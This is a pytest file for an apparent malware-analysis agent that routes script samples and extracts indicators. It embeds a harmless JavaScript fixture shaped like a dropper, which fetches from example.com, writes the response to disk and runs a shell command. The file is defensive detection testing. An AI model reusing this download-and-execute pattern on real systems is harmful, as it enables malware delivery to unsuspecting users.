"""Script route: routing, entry_node detection, script_analysis_node and graph wiring."""

from __future__ import annotations

import pytest

import nodes
from graph import ROUTES, build_graph
from nodes import decide_route, entry_node, script_analysis_node
from state import AgentState, Finding, SampleInfo

# Harmless excerpt shaped like a classic JS download-write-execute dropper. It is never run.
_JS_DROPPER = """\
var http = new ActiveXObject("MSXML2.XMLHTTP");
var stream = new ActiveXObject("ADODB.Stream");
http.open("GET", "http://example.com/a", false);
http.send();
stream.Write(http.ResponseBody);
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd /c calc.exe");
var c2 = "192.0.2.10";
"""

_VBS_SNIPPET = 'Dim sh\nSet sh = CreateObject("WScript.Shell")\n'


def _write(tmp_path, name: str, data: str | bytes) -> str:
    path = tmp_path / name
    if isinstance(data, str):
        path.write_text(data, encoding="utf-8")
    else:
        path.write_bytes(data)
    return str(path)


def _patch_scan(monkeypatch, die_info: dict | None = None) -> None:
    monkeypatch.setattr(nodes, "compute_sha256", lambda p: "f" * 64)
    monkeypatch.setattr(nodes, "run_die", lambda p: die_info or {})
    monkeypatch.setattr(nodes, "run_yara", lambda p, rules_dir="": [])


# --------------------------------------------------------------------------- #
# decide_route
# --------------------------------------------------------------------------- #
class TestDecideRouteScript:
    def test_script_type_routes_to_script(self) -> None:
        assert decide_route({}, [], "js") == "script"
        # script wins over the DIE hints (order: fast_track -> script -> python -> dotnet -> native)
        assert decide_route({"language": "Python"}, [], "vbs") == "script"

    @pytest.mark.parametrize(
        ("die_info", "expected"),
        [
            ({}, "native"),
            ({"language": "Python"}, "python"),
            ({"compiler": "PyInstaller"}, "python"),
            ({"detected": ".NET"}, "dotnet"),
            ({"language": "C#"}, "dotnet"),
            ({"packer": "UPX"}, "native"),
        ],
    )
    def test_none_script_type_keeps_old_behaviour(self, die_info: dict, expected: str) -> None:
        assert decide_route(die_info, [], None) == expected
        assert decide_route(die_info, []) == expected  # old 2-arg callers keep working

    def test_known_malware_yara_still_wins_over_script(self) -> None:
        yara = [{"rule": "known", "meta": {"classification": "known_malware"}}]
        assert decide_route({}, yara, "js") == "fast_track"


# --------------------------------------------------------------------------- #
# entry_node: script detection
# --------------------------------------------------------------------------- #
class TestEntryNodeScript:
    def test_vbs_file_routes_to_script(self, tmp_path, monkeypatch) -> None:
        path = _write(tmp_path, "sample.vbs", _VBS_SNIPPET)
        _patch_scan(monkeypatch)

        out = entry_node(AgentState(file_path=path))

        assert out["route_flag"] == "script"
        assert out["sample"].route == "script"
        assert out["sample"].file_type == "script/vbs"
        assert out["sample"].arch == "unknown"  # DIE gave nothing; defaults kept
        assert out["sample"].packer == "unknown"

    def test_pe_magic_named_js_is_not_script(self, tmp_path, monkeypatch) -> None:
        path = _write(tmp_path, "evil.js", b"MZ" + b"\x00" * 64)
        _patch_scan(monkeypatch)

        out = entry_node(AgentState(file_path=path))

        assert out["route_flag"] != "script"
        assert out["sample"].route != "script"
        assert not out["sample"].file_type.startswith("script/")


# --------------------------------------------------------------------------- #
# script_analysis_node
# --------------------------------------------------------------------------- #
class TestScriptAnalysisNode:
    @staticmethod
    def _state(path: str, **kwargs) -> AgentState:
        options = {
            "route_flag": "script",
            "sample": SampleInfo(route="script", file_type="script/js"),
            **kwargs,
        }
        return AgentState(file_path=path, **options)

    def test_wrong_route_returns_empty(self, tmp_path) -> None:
        path = _write(tmp_path, "a.js", _JS_DROPPER)
        state = AgentState(file_path=path, route_flag="native", sample=SampleInfo(file_type="PE"))
        assert script_analysis_node(state) == {}

    def test_findings_iocs_and_no_source_code(self, tmp_path, monkeypatch) -> None:
        monkeypatch.setenv("CROWBAR_TOOL_PROFILE", "core")  # must run in every profile
        path = _write(tmp_path, "dropper.js", _JS_DROPPER)

        out = script_analysis_node(self._state(path, extracted_strings=["keep-me"]))

        kinds = {f.kind for f in out["findings"]}
        assert {"combo", "url", "ip"} <= kinds
        assert {f.source for f in out["findings"]} == {"script"}
        assert all(f.finding_id for f in out["findings"])
        assert "http://example.com/a" in out["extracted_strings"]
        assert "192.0.2.10" in out["extracted_strings"]
        assert out["extracted_strings"][0] == "keep-me"  # existing values are kept
        assert "source_code" not in out  # script text must never reach the LLM

    def test_script_type_falls_back_to_detection(self, tmp_path) -> None:
        path = _write(tmp_path, "dropper.js", _JS_DROPPER)
        state = AgentState(file_path=path, route_flag="script")  # default file_type "unknown"

        out = script_analysis_node(state)

        assert any(f.source == "script" for f in out["findings"])

    def test_unknown_script_type_returns_empty(self, tmp_path) -> None:
        path = _write(tmp_path, "note.bin", b"just a plain text file\n")
        state = AgentState(file_path=path, route_flag="script")

        assert script_analysis_node(state) == {}

    def test_existing_findings_are_merged(self, tmp_path) -> None:
        path = _write(tmp_path, "dropper.js", _JS_DROPPER)
        yara = Finding(source="yara", kind="rule", value="suspicious_js")

        out = script_analysis_node(self._state(path, findings=[yara]))

        values = {(f.source, f.kind, f.value) for f in out["findings"]}
        assert ("yara", "rule", "suspicious_js") in values
        assert any(f.source == "script" for f in out["findings"])
        assert all(f.finding_id for f in out["findings"])


# --------------------------------------------------------------------------- #
# Graph wiring
# --------------------------------------------------------------------------- #
class TestScriptGraphWiring:
    @staticmethod
    def _edges() -> set[tuple[str, str]]:
        return {(e.source, e.target) for e in build_graph().get_graph().edges}

    def test_script_route_is_wired_and_skips_binary_nodes(self) -> None:
        assert ROUTES["script"] == "script_analysis_node"
        edges = self._edges()
        assert ("entry_node", "script_analysis_node") in edges  # via the conditional map
        assert ("script_analysis_node", "ioc_extractor_node") in edges
        assert ("script_analysis_node", "static_feature_node") not in edges
        assert ("script_analysis_node", "deep_inspection_node") not in edges

    def test_script_sample_never_reaches_binary_tools(self, tmp_path, monkeypatch) -> None:
        path = _write(tmp_path, "dropper.js", _JS_DROPPER)
        monkeypatch.setenv("CROWBAR_SKIP_LLM", "1")
        monkeypatch.setenv("CROWBAR_SKIP_DB", "1")
        _patch_scan(monkeypatch)

        def forbidden(*args, **kwargs):
            raise AssertionError("a binary tool was called for a script sample")

        monkeypatch.setattr(nodes, "run_ghidra", forbidden)
        monkeypatch.setattr(nodes, "run_capa", forbidden)
        monkeypatch.setattr(nodes, "run_floss_with_hints", forbidden)

        result = AgentState(**build_graph().invoke(AgentState(file_path=path)))

        assert result.route_flag == "script"
        assert result.sample.route == "script"
        assert result.sample.file_type == "script/js"
        assert result.source_code == []
        assert any(f.source == "script" for f in result.findings)
        assert "http://example.com/a" in result.iocs.get("ioc", [])
